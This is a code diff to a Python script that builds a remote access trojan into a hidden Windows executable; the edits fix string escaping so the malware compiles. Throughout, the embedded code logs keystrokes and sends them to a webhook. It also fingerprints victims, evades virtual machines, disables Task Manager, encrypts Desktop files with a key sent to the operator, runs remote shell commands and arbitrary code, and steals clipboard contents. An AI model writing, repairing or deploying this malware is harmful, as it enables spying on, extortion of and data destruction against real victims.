@@ -43,9 +43,9 @@ KEYLOG_BUFFER = ""
 def send(msg="", embed=None, file=None):
     global WEBHOOK_URL
     if msg:
-        msg = f"[{VICTIM_ID}] {{msg}}"  # Double braces to escape literal { }
+        msg = f"[{{VICTIM_ID}}] {{msg}}"  # Doubled braces = literal {VICTIM_ID}
     if embed and "title" in embed:
-        embed["title"] = f"[{VICTIM_ID}] {{embed['title']}}"
+        embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
     data = {{"content": msg}}
     if embed:
         data["embeds"] = [embed]
@@ -60,9 +60,10 @@ def info():
         ip = requests.get("https://api.ipify.org", timeout=5).text
     except:
         ip = "Unknown"
-    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {VICTIM_ID}\\n**User:** {getpass.getuser()}\\n**PC:** {socket.gethostname()}\\n**IP:** {ip}", "color": 16711680}}
+    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
     send(embed=embed)
 
+# Rest of the code unchanged - all functions from previous version
 def anti_vm():
     try:
         if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
@@ -88,9 +89,9 @@ def on_press(key):
     try:
         KEYLOG_BUFFER += key.char
     except:
-        KEYLOG_BUFFER += f" [{str(key)}] "
+        KEYLOG_BUFFER += f" [{{str(key)}}] "
     if len(KEYLOG_BUFFER) > 500:
-        send(f"Keylog dump:\\n{KEYLOG_BUFFER}")
+        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
         KEYLOG_BUFFER = ""
 
 def screenshot():
@@ -109,7 +110,7 @@ def toggle_tm(enable=True):
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
         winreg.CloseKey(key)
-        send(f"Task Manager {'enabled' if enable else 'disabled'}")
+        send(f"Task Manager {{'enabled' if enable else 'disabled'}}")
     except:
         pass
 
@@ -121,7 +122,7 @@ def bsod():
 def encrypt(path=os.path.expanduser("~\\Desktop")):
     key = Fernet.generate_key()
     f = Fernet(key)
-    send(f"ENCRYPTION KEY - SAVE IT: {key.decode()}")
+    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
     count = 0
     exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
     for root, _, files in os.walk(path):
@@ -137,17 +138,17 @@ def encrypt(path=os.path.expanduser("~\\Desktop")):
                     count += 1
                 except:
                     pass
-    send(f"Encrypted {count} files in {path}")
+    send(f"Encrypted {{count}} files in {{path}}")
 
 def shell(cmd):
     try:
         out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
     except Exception as e:
         out = str(e)
-    send(f"Shell output:\\n{out[:3000]}")
+    send(f"Shell output:\\n{{out[:3000]}}")
 
 def clipboard():
-    send(f"Clipboard: {pyperclip.paste()}")
+    send(f"Clipboard: {{pyperclip.paste()}}")
 
 def reboot():
     subprocess.call("shutdown /r /t 0", shell=True)
@@ -162,7 +163,7 @@ def runscript(code):
         exec(code)
         send("Script executed")
     except Exception as e:
-        send(f"Script error: {str(e)}")
+        send(f"Script error: {{str(e)}}")
 
 def setwebhook(url):
     global WEBHOOK_URL
@@ -178,7 +179,7 @@ def poll():
                 parts = full.split(" ", 1)
                 cmd = parts[0].lower()
                 arg = parts[1] if len(parts) > 1 else ""
-                send(f"Command received: {full}")
+                send(f"Command received: {{full}}")
                 if cmd == "ss":
                     screenshot()
                 elif cmd == "lock":
@@ -203,9 +204,6 @@ def poll():
                     runscript(arg)
                 elif cmd == "setwebhook":
                     setwebhook(arg)
-                # Clear command after execution
-                del cmds[str(VICTIM_ID)]
-                # Optional: write back cleared Gist if you want
         except:
             pass
         time.sleep(POLL_INTERVAL)
@@ -223,7 +221,7 @@ if __name__ == "__main__":
 with open("rat.py", "w") as f:
     f.write(rat_code)
 
-print("Building fixed RAT...")
+print("Building fixed RAT - no more brace errors...")
 subprocess.run([
     "pyinstaller","--onefile","--noconsole",
     "--collect-all","pynput",
@@ -237,7 +235,7 @@ shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"Fixed EXE ready: dist\\{output_name}")
+print(f"Clean EXE ready: dist\\{output_name}")
 
 
 
